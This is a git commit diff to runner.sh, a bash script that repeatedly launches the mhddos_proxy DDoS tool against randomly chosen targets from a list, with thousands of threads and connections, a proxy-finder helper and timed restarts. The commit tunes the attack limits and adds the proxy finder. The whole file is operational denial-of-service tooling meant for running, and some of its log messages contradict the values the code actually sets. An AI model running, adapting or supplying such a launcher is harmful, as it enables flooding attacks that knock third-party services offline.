b11987cc619f70e0bb992e276f50a80c62d8df29
alexnest-ua <74729549+alexnest-ua@users.noreply.github.com>
2022-05-11 01:33:25 +0300

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -4,42 +4,41 @@ restart_interval="20m"
 
 ulimit -n 1048576
 
-
 #Just in case kill previous copy of mhddos_proxy
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
 sudo pkill -e -f runner.py
-sudo pkill -e -f ./start.py
+sudo pkill -e -f finder.py
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 
 
 num_of_copies="${1:-1}"
 if [[ "$num_of_copies" == "all" ]];
 then	
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
-	num_of_copies=3
-elif ((num_of_copies > 3));
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 2 is not effective)\033[0;0m\n"
+	num_of_copies=2
+elif ((num_of_copies > 2));
 then 
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
-	num_of_copies=3
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 2 is not effective)\033[0;0m\n"
+	num_of_copies=2
 elif ((num_of_copies < 1));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack (less than 1 is not effective)\033[0;0m\n"
 	num_of_copies=1
-elif ((num_of_copies != 1 && num_of_copies != 2 && num_of_copies != 3));
+elif ((num_of_copies != 1 && num_of_copies != 2));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack\033[0;0m\n"
 	num_of_copies=1
 fi
 
 threads="${2:-1500}"
-if ((threads < 1000));
+if ((threads < 500));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
 	threads=1000
-elif ((threads > 6000));
+elif ((threads > 4000));
 then
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 6000 threads\033[0;0m\n"
-	threads=6000
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 3000 threads\033[0;0m\n"
+	threads=4000
 fi
 
 rpc="${3:-1000}"
@@ -47,10 +46,10 @@ if ((rpc < 1000));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too LOW amount of rpc(connections) - attack will be started with 1000 rpc(connections)\033[0;0m\n"
 	rpc=1000
-elif ((rpc > 5000));
+elif ((rpc > 2500));
 then
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 5000 rpc(connections)\033[0;0m\n"
-	rpc=5000
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 2500 rpc(connections)\033[0;0m\n"
+	rpc=2500
 fi
 
 debug="${4:-}"
@@ -73,26 +72,9 @@ do
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
 	
-   	if (("$num_of_copies" == "all"));
-	then	
-		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
-		then
-			random_numbers=$(shuf -i 1-$list_size -n 3)
-		else
-			random_numbers=$(shuf -i 1-$list_size -n $list_size)
-		fi
-	elif ((num_of_copies > list_size));
+   	if ((num_of_copies > list_size));
 	then 
-		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
-		then
-			random_numbers=$(shuf -i 1-$list_size -n 3)
-		else
-			random_numbers=$(shuf -i 1-$list_size -n $list_size)
-		fi
-	elif ((num_of_copies < 1));
-	then
-		num_of_copies=1
-		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
+		random_numbers=$(shuf -i 1-$list_size -n $list_size)
 	else
 		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
 	fi
@@ -112,21 +94,28 @@ do
             
             cd ~/mhddos_proxy
             sudo python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
+            sleep 20s
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
+   	sleep 5s
+	
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mStarting our new proxy_finder, next restart in $restart_interval...\033[1;0m"
+		
+	cd ~/proxy_finder
+	sudo python3 finder.py&
+	
    	sleep $restart_interval
 	clear
    	
    	#Just in case kill previous copy of mhddos_proxy
-   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
+   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
    	sudo pkill -e -f runner.py
-   	sudo pkill -e -f ./start.py
-   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+	sudo pkill -e -f finder.py
+   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"
 	
    	no_ddos_sleep="$(shuf -i 1-3 -n 1)m"
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
 	sleep $no_ddos_sleep
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
-	
 done
